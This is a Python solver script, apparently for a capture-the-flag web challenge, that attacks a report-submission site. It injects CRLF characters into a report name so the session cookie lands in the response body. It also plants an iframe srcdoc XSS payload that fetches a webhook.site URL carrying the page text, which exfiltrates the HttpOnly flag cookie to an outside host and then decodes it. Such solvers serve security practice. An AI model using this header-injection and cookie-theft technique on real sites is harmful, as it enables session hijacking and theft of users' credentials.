import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite, find_flag

import base64
import json
import time
import re
import base64

BASE_URL = "https://report.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def submit_report(self, name: str, content: str) -> str:
        response = self.session.post(f"{BASE_URL}/report", data={
            "name": name,
            "content": content
        })

        session_cookie = response.cookies.get("session")
        session_cookie_payload = session_cookie.split('.')[0]

        padding = '=' * (-len(session_cookie_payload) % 4)
        decoded = base64.urlsafe_b64decode(session_cookie_payload + padding).decode()

        report_uuid = json.loads(decoded)["reports"][0]
        return report_uuid

    # Contains source code. /view endpoint found in https://report.quoccacorp.com/robots.txt
    def view_report(self, report_uuid: str):
        view_report_url = f"{BASE_URL}/view/{report_uuid}"
        return self.session.get(view_report_url)

    # Meme
    # def base64_to_image(self, image_base64_str: str = "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"):
    #     from PIL import Image
    #     from io import BytesIO
    #     image_bytes = base64.b64decode(image_base64_str)
    #     image = Image.open(BytesIO(image_bytes))
    #     image.show()

    def main(self):
        # Use document.body.innerText to send HttpOnly cookies
        SRCDOC_PAYLOAD = f'''<script>fetch(`{self.webhooksite.url}?q=${{window.parent.document.body.innerText}}`);</script>'''
        PAYLOAD = f'''<iframe srcdoc="{SRCDOC_PAYLOAD}"></iframe>'''

        # Use \r\n\r\n to push the cookie into the response body
        self.submit_report("\r\n\r\n", PAYLOAD)

        time.sleep(6)

        q_value = self.webhooksite.get_requests_json()["data"][0]["query"]['q']
        flag_base64 = re.search(r'flag=([^;]+);', q_value).group(1)

        # Base64 decode the flag cookie
        find_flag(base64.b64decode(flag_base64).decode())

if __name__ == "__main__":
    Solver().main()
